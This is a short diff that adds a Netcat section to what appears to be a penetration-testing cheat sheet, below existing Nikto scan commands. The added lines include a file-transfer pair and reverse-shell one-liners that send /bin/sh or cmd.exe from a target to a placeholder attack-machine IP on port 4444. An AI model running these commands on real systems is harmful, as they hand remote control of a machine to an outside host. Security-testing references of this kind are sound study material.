@@ -107,3 +107,19 @@ nikto - h <target_IP> -p 80 -o nikto_results -F txt
 nikto -id username:password -h <target_IP>:1234/path/
 ```
 <br/>
+
+### **Netcat**
+- Most-used commands
+```bash
+# To transfer TargetFile from server to local  machine, first typing in local machine
+nc -l -p 4444 > TargetFile
+# then type in server
+nc -w 3 Local_Machine_IP 4444 < TargetFile
+
+# Netcat reverse shell, from attack_machine:
+nc -lvp 4444
+# from Linux target machine:
+nc <attack_machine_IP> 4444 -e /bin/sh
+# from Windows target machine:
+nc.exe <attack_machine_IP> 4444 -e cmd.exe
+```
